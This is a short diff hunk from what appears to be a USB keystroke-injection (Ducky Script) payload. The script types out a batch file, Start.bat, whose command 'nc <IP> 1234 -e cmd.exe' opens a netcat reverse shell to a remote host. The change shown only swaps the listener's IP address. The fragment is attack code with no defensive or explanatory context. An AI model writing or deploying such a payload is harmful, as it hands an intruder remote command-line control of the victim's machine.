@@ -34,7 +34,7 @@ DELAY 500
 REM --> Creates a batch file to start listening 
 STRING copy con Start.bat
 ENTER
-STRING nc 192.168.112.135 1234 -e cmd.exe
+STRING nc 10.10.30.45 1234 -e cmd.exe
 ENTER
 CONTROL z
 ENTER
